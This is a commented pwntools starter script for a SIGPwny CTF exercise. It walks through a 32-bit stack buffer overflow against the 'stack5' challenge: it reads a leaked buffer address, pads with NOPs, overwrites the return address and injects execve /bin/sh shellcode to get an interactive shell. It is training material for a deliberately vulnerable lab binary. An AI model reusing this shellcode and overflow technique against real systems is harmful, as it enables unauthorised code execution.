################################
# SIGPwny Stack 5 Starter Code #
################################
# Run with 'python stack5_starter.py'

# Import pwntools
from pwn import *

context.log_level = "debug"
# 32-bit shellcode to execute /bin/sh
# How this works is not important- all you need to know is these bytes are "instructions" that the CPU can run
# Our job is to insert these instructions into program memory, and then trick the CPU into running them to get a shell!
# Once we get a shell, we can do 'ls', 'cat file', etc.- all basic shell commands will work

shellcode = b"\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
# shellcode = asm(shellcraft.i386.linux.sh())

#########################################################
# Step -1: Connect to challenge                         #
# You can use remote(), process(), or gdb.debug()       #
# Uncomment lines 18, 25, or 31 respectively to choose. #
#########################################################

# Connect to the real live challenge
conn = remote("chal.sigpwny.com", 1356)

# Connect to the process locally
# (assuming you downloaded the file and named it stack5)
# You may need to make the local file executable, do it with:
# 'chmod +x stack5'

# conn = process("./stack5")
# gdb.attach(conn)
# Debug our exploit
# This opens GDB in a new window
# Developping exploits with GDB is quite useful!

# conn = gdb.debug("./stack5")

######################
# START EXPLOIT CODE #
######################

###########################################################
# Step 0: Read the given address and convert it to an int #
###########################################################

# First, absorb the 2 lines we don't care about
conn.recvline()  # This is SIGPwny stack5, go
conn.recvline()  # We don't have a function to print the flag anymore :(. But ASLR and NX are both off. Use shellcode!

# The 3rd line is of the form "&buf = 0xVALUE"
buf_addr = conn.recvline()

# Remove trailing or leading whitespace chars / newline chars and decode from bytestring to regular python string
# This just makes string processing easier
buf_addr = buf_addr.decode().strip()

# Split on every " " (space char). This returns an array of the form:
# ["&buf", "=", "0xVALUE"]
buf_addr = buf_addr.split(" ")

# We want the very last element, which we can get with [-1] in python
buf_addr = buf_addr[-1]  # 0xVALUE

# Now, we want to cut off the first 2 chars (the "0x") part of the string
buf_addr = buf_addr[2:]  # VALUE

# Now, let's convert the buf address from a string to an int
buf_addr = int(buf_addr, 16)

# (You could do all of the above in a single one liner as well)
# buf_addr = int(conn.recvline().decode().strip().split(" ")[-1][2:],16)
# gdb.attach(conn)
print("Buffer is located at: " + hex(buf_addr))

###############################
# Step 1: Overflow the stack! #
###############################

# Replace with the number of bytes we need! (You can use GDB for this)
# You need to determine this
num_bytes_to_overflow = 0

buf = b"\x90" * 44

#####################################
# Step 2: Encode the return address #
#####################################

# Remember, you pack addresses for 32 bit with pwntools using p32(address as int)
# So, to encode the address of the buffer + some offset, use:
# p32(buf_addr + offset_to_shellcode)

# You need to determine this!
offset_to_shellcode = 48

buf += p32(buf_addr + offset_to_shellcode)

#########################
# Step 3: Add shellcode #
#########################

buf += shellcode

#############################
# Step 4: Send the exploit! #
#############################

conn.sendline(buf)

###########################
# Step 5: Go interactive! #
###########################

# Never forget to go interactive
# Once we get here, we should be able to execute regular shell commands, like "ls"
conn.interactive()

# Profit??
